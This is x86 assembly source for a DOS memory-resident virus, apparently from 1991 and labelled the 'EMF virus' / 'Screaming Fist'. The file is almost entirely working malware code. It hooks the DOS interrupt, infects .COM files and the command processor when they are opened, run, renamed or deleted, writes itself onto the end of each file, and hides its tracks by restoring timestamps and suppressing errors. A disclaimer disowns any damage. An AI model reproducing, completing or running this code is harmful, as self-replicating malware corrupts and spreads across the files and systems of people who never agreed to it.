ORG 100H


; The EMF virus (c)1991 by Lazarus Long, Inc.
;  The author assumes no responsibility for any damage incurred
;  from the infection caused by this virus
;

CURTAIN_OPEN EQU $

OLD_21_BX DW 00 00
OLD_21_ES DW 00 00


ARE_WE_RESIDENT?:
 CALL NEXT_PLACE
NEXT_PLACE:
 POP BP                            ;Get BP for offsets
 MOV AX,0FFFFH                     ;Will return AX=0 if virus is resident
 INT 21H
 OR AX,AX                          ;Are we resident?
 JNZ START                         ;If not, install

LEAVE_AND_RESTORE:
 CALL RESTORE_EIGHT                ;Restore this files beginning
 MOV SI,100H                       ;And return to it
 PUSH SI
 RET 0FFFFH

START:
 PUSH DS                             ;Save DS register
 XOR  AX,AX                          ;Now make DS=0
 MOV  DS,AX
 DEC  WORD PTR [0413]                ;Decrease available memory by 1k
 LDS  BX,[0084]                      ;Get INT 21 vector and save it
 CS:
 MOV  [BP+OLD_21_BX-NEXT_PLACE],BX
 CS:
 MOV  [BP+OLD_21_ES-NEXT_PLACE],DS
 MOV  BX,ES                          ;Get address of our memory block
 DEC  BX
 MOV  DS,BX
 SUB  WORD PTR [0003],0080           ;Decrease memory allocated to this program
 MOV  AX,[0012]                      ;Decrease total memory
 SUB  AX,0080
 MOV  [0012],AX
 MOV  ES,AX                          ;Also gives us ES=Top of memory
 PUSH CS                             ;CS=DS
 POP  DS
 MOV  SI,BP                          ;Offset of code to move
 SUB  SI,7
 MOV  DI,CURTAIN_OPEN                ;ES:CURTAIN_OPEN is destination
 MOV  CX,LENGTH                      ;Move entire virus
 CLD
 REPZ MOVSB
 MOV  DS,CX                          ;Zero out DS
 CLI                                 ;No interrupts allowed
 MOV  WORD PTR [0084],OFFSET NEW_21  ;Set INT 21 to our code
 MOV  [0086],AX
 STI
 PUSH CS                             ;CS=DS
 POP DS
 PUSH CS                             ;ES=CS
 POP ES
 MOV AX,3DFFH                        ;Code to infect command processor
 INT 21H
 JMP LEAVE_AND_RESTORE

NEW_21:                ;Infect files on:
 PUSHF
 CMP AH,3DH            ;Opening
 JZ OPENING
 CMP AH,4BH            ;Running
 JZ INFECT_REGULAR
 CMP AH,41H            ;Deleting
 JZ INFECT_REGULAR
 CMP AH,43H            ;Chmod
 JZ INFECT_REGULAR
 CMP AH,56H            ;Renaming
 JZ INFECT_REGULAR
 ;CMP AH,4EH           ;Correct size if file is infected
 ;JZ CORRECT_SIZE
 ;CMP AH,4FH
 ;JZ CORRECT_SIZE
 CMP AX,0FFFFH
 JNZ OUTTA_HERE

 POPF                            ;Return to show that virus is resident
 INC AX
 IRET

OUTTA_HERE:
 POPF                            ;Continue with old INT 21
 JMP DWORD PTR CS:[OLD_21_BX]

OPENING:
 CMP AL,0FFH                     ;Do we need to infect command processor?
 JNZ INFECT_REGULAR              ;Nope, continue

INFECT_COMMAND_PROCESSOR:
 PUSH    ES
 MOV     ES,DS:2CH
 MOV     DI,0                    ;ES:DI points to environment

FIND_COMSPEC:
 PUSH CS
 POP DS
 MOV SI,OFFSET COMSPEC
 LODSB
 MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
 REPNZ   SCASB                   ;Search for first character
 MOV     CX,7

CHECK_NEXT_7:
 LODSB
 SCASB
 JNZ     FIND_COMSPEC            ;If not all there, abort & start over
 LOOP    CHECK_NEXT_7            ;Loop to check the next character
 MOV     DX,DI
 PUSH ES                         ;ES=DS=CS
 POP  DS
 POP  ES
 INC  DI                         ;DS:DX is command processor (hopefully)
 MOV  SI,DI
 LODSW
 CMP AX,'\:'                     ;Do we have a valid name?
 JZ INFECT_REGULAR
 PUSH CS                         ;DS=CS
 POP DS
 MOV DX,OFFSET COMMAND           ;If not, let's use C:\COMMAND.COM

INFECT_REGULAR:
 PUSH AX                         ;Save all registers
 PUSH BX
 PUSH CX
 PUSH DX
 PUSH SI
 PUSH DI
 PUSH DS
 PUSH ES
 PUSH BP
 PUSH SP

 CALL DISEASE                    ;Infect file

 POP  SP                         ;Restore all registers
 POP  BP
 POP  ES
 POP  DS
 POP  DI
 POP  SI
 POP  DX
 POP  CX
 POP  BX
 POP  AX

LEAVE_US:
 JMP OUTTA_HERE                  ;Continue with original INT 21

FUNCTION:                        ;Used by virus to call old INT 21
 PUSHF
 CALL DWORD PTR CS:[OLD_21_BX]
 RET

;-------------------------------------------------------------------------------
;There is an error somewhere in this routine to show the correct size on
;infected files. Therefore I have commented it out until I can fix it later
;-------------------------------------------------------------------------------
;
;CORRECT_SIZE:
; PUSH BX                       ;Save registers
; PUSH BP
; PUSH ES
; PUSH AX
; MOV AH,2FH                    ;Get DTA address, because that's where dir
; CALL FUNCTION                 ;Info goes
; POP AX                        ;Restore AX register
; PUSH AX                       ;And save it again
; CALL FUNCTION                 ;Do original function (Find first or Find next)
; JC NO_SIZE_CHANGE             ;If no files found, continue with old INT 21
; MOV BP,BX                     ;Otherwise, use BP as an offset
; MOV AX,ES:[BP+16H]            ;Get filetime
; AND AL,1EH
; CMP AL,1EH                    ;Is it infected?
; JNZ NO_SIZE_CHANGE            ;If not, no need to adjust it
; SUB ES:[BP+1AH]W,LENGTH       ;Correct length
;
;
;NO_SIZE_CHANGE:
; POP AX
; POP ES
; POP BP
; POP BX
; JC LEAVE_US
; POPF
; IRET

DISEASE:
VIRUS_BEGINS_HERE:
         CALL NEXT_STEP
NEXT_STEP:
         POP BP                             ;All actions relative to BP
         PUSH DX
;******************************************************************************;
;                                                                              ;
;******************************************************************************;

SAVE_PSP:
         MOV AH,30H                        ;Get DOS version
         CALL FUNCTION
         CMP AL,2                          ;Lower than 2?
         JBE NEED_TO_LEAVE                 ;No,continue

ABOVE_2:
         PUSH ES                           ;Save ES
         MOV AX,3524H                      ;Get INT 24 address
         CALL FUNCTION                     ;
         MOV CS:[BP+OLD_24_BX-NEXT_STEP],BX    ;Save it
         MOV CS:[BP+OLD_24_ES-NEXT_STEP],ES    ;
         MOV AH,25H                        ;Now set it to our own code
         LEA DX,[BP+NEW_24-NEXT_STEP]      ;Offset of our INT 24 code
         PUSH DS                           ;
         PUSH CS                           ;
         POP DS                            ;
         CALL FUNCTION                     ;
         POP DS                            ;
         POP ES                            ;Restore ES


;------------------------------------------------------------------------------;                                                                              ;
;Checks to see whether or not target file is a .COM and quits if it ain't.     ;
;------------------------------------------------------------------------------;

IS_IT_COM:
         POP DX                          ;Offset of name
         PUSH DX
         PUSH DS
         POP ES
         MOV DI,DX
         MOV AL,'.'
         MOV CX,0FFH                     ;Search 255 bytes
         REPNZ SCASB                     ;Look for the . in filename
         JCXZ NEED_TO_LEAVE              ;Did we exhaust CX?
         MOV SI,DI                       ;Offset of extension
         LODSW                           ;Load it
         AND AX,0DFDFH                   ;Convert it to caps
         CMP AX,'OC'                     ;Is it CO?
         JNZ NEED_TO_LEAVE               ;If not, leave
         LODSB                           ;load last letter
         AND AL,0DFH                     ;Convert to caps
         CMP AL,'M'                      ;Is it M?
         JZ SET_ATTRIBS                 ;No error, continue at SET_ATTRIBS

NEED_TO_LEAVE:
         POP DX
         JMP DONE                        ;Clear stack
                                         ;And return

SET_ATTRIBS:
         POP DX
         PUSH DX
         MOV AX,4300H                ;Get the attributes
         CALL FUNCTION
         MOV CS:[95H],CX             ;Save them for later
         JC NEED_TO_LEAVE
         TEST CL,01H                 ;Do we need to change any attribs?
         JZ OPEN_IT                  ;If not, continue
         AND CL,0FEH
         MOV AX,4301H
         CALL FUNCTION               ;Set attribs to normal
         JC LEAVE_WITH_ATTRIBS       ;Leave if error
         MOV AX,4301H                ;Set file attribs
         XOR CX,CX                   ;To normal file
         CALL FUNCTION
         JC LEAVE_WITH_ATTRIBS       ;Some sort of error occured,exit now!
OPEN_IT:

         MOV AX,3D02H                    ;Open file with Read and Write access
         CALL FUNCTION
         JC LEAVE_AND_CLOSE
         MOV BX,AX                       ;Save handle
         MOV AH,3FH                      ;Read four bytes into CS:0ACh
         MOV DX,0ACH
         MOV CX,4
         PUSH DS
         PUSH CS
         POP DS
         CALL FUNCTION
         POP DS
         JC LEAVE_AND_CLOSE
         MOV AL,CS:[0AFH]b               ;An FFh means this file is probaly
         CMP AL,0FFH                     ;Already infected
         JNZ CONTINUE_TO_INFECT

LEAVE_AND_CLOSE:
         CALL RESTORE_ATTRIBS
         MOV AH,3EH                      ;Close this file
         CALL FUNCTION
         JMP NEED_TO_LEAVE

LEAVE_WITH_ATTRIBS:
         CALL RESTORE_ATTRIBS
         JMP NEED_TO_LEAVE

;------------------------------------------------------------------------------;
; Open file and infect it.                                                     ;
;                                                                              ;
;------------------------------------------------------------------------------;
CONTINUE_TO_INFECT:
         POP DX
         PUSH DX                     ;Offset into DTA of filename
         MOV AX,4202H                ;Send RW pointer to end of file
         XOR CX,CX
         XOR DX,DX
         CALL FUNCTION
         JC NEED_TO_LEAVE
         CMP DX,0                    ;A non-zero DX means to big of a file
         JNZ NEED_TO_LEAVE
         CMP AX,300                  ;Don't infect files less than 300 bytes
         JB NEED_TO_LEAVE
         CMP AX,64000                ;Or bigger than 64000
         JA NEED_TO_LEAVE
         INC AX                      ;Use the pointer as our jump code
         MOV CS:[0F9H],AX
         POP DX
         PUSH DX
         MOV AX,5700H                ;Get the file time and date
         CALL FUNCTION
         MOV CS:[96H],CX             ;And save them for later
         MOV CS:[98H],DX
         POP DX
         PUSH DX

;------------------------------------------------------------------------------;
; Infect .COM header so it jumps to our viral code                             ;
;------------------------------------------------------------------------------;
MAKE_HEADER:

         MOV CS:[0F8H]B,0E9H          ;Code for absolute JMP
         MOV AX,4200H                 ;Set file pointer to beginning
                                      ;of file to be infected
         XOR CX,CX                    ;Zero out CX
         XOR DX,DX                    ;Zero out DX
         CALL FUNCTION
         MOV CS:[0FBH]B,0FFH
         PUSH DS                      ;DS=CS
         PUSH CS
         POP DS
         MOV AH,40H                   ;Write to file
         MOV DX,0F8H                  ;Starting at F8 hex
         MOV CX,04H                   ;Write eight bytes
         CALL FUNCTION
         POP DS
ERROR:   
         JNC ATTACH
         JMP NEED_TO_LEAVE            ;Some sort of error?
                                      ;If so,exit
;------------------------------------------------------------------------------;
; Attach our viral code to the end of the target .COM file                     ;
;                                                                              ;
;------------------------------------------------------------------------------;
ATTACH:
         PUSH DS                     ;DS=CS
         PUSH CS
         POP DS
         MOV SI,0ACH                 ;Starting at CS:0ACH
         MOV CX,04                   ;Move four bytes
         PUSH ES                     ;ES=CS
         PUSH CS
         POP ES
         LEA DI,[BP+ORIGINAL_EIGHT-NEXT_STEP];Where to save original eight bytes to
         REP MOVSB                   ;Save infected files original eight bytes
         MOV AX,4202H                ;Set file pointer to end of file
                                     ;
         XOR CX,CX                   ;Zero CX
         XOR DX,DX                   ;Zero DX
         CALL FUNCTION
         POP ES
         POP DS
INFECT:
         PUSH DS                     ;DS=CS
         PUSH CS
         POP DS
         MOV AH,40H                  ;Code for handle write
         MOV DX,CURTAIN_OPEN         ;Start of viral code
         MOV CX,LENGTH               ;Length of our viral code
         CALL FUNCTION               ;Write all of virus
         POP DS

;------------------------------------------------------------------------------;
; This restores the files original date and time                               ;
;------------------------------------------------------------------------------;

         MOV AX,5701H                   ;Restore original date and time
         MOV CX,CS:[96H]                ;From what was read in earlier
         MOV DX,CS:[98H]                ;
         CALL FUNCTION                  ;
         MOV AH,3EH                     ;Close that file
         CALL FUNCTION                  ;
         JC ERROR
         POP DX                         ;DS:DX is filename
         CALL RESTORE_ATTRIBS           ;Restore it's attributes

DONE:
RESTORE_PSP:
         PUSH DS                           ;Save the DS register
         MOV DX,CS:[BP+OLD_24_BX-NEXT_STEP]W   ;Move the old INT 24's address
         MOV DS,CS:[BP+OLD_24_ES-NEXT_STEP]W   ;so we can restore it
         MOV AX,2524H                      ;Restore it
         CALL FUNCTION
         POP DS                            ;Restore the DS register

         RET                                ;And quit

;------------------------------------------------------------------------------
;This code is only called from low memory
;------------------------------------------------------------------------------

 RESTORE_EIGHT:
         PUSH CS
         POP DS
         PUSH DS
         POP ES
         LEA SI,[BP+ORIGINAL_EIGHT-NEXT_PLACE] ;Restore original eight bytes so
                                               ;we can RET to them
         MOV DI,100H                           ;Destination of move
         MOV CX,04                             ;Move eight bytes
         REP MOVSB
         RET


RESTORE_ATTRIBS:
;------------------------------------------------------------------------------;
; This routine restores the files original attributes.                         ;
;------------------------------------------------------------------------------;        
         MOV AX,4301H                   ;Restore original attribs
         XOR CX,CX                      ;Zero out CX
         MOV CL,CS:[95H]                ;To what was read in earlier
                                        ;Offset of filename
         CALL FUNCTION
         RET

NEW_24:
         XOR AX,AX                      ;Any error will simply be ignored
         STC                            ;Most useful for write protects
         IRET

OLD_24_ES DW 00 00
OLD_24_BX DW 00 00

ORIGINAL_EIGHT EQU $
OLD_EIGHT_BYTES EQU $
                MOV AH,4CH
                INT 21H

                                              ;Bytes that are moved
                                                     ;and RET'd to

;------------------------------------------------------------------------------
;Don't be a lamer and change the text to claim it was your own creation.
;------------------------------------------------------------------------------

TEXT DB 'Screaming Fist (c)10/91'
     DB ,00,

COMMAND DB 'C:\COMMAND.COM',00                ;File infected if no COMSPEC
COMSPEC DB 'COMSPEC='                 ;Looked for to infect command processor
ENC_END EQU $

FINI EQU $

LENGTH = FINI - CURTAIN_OPEN
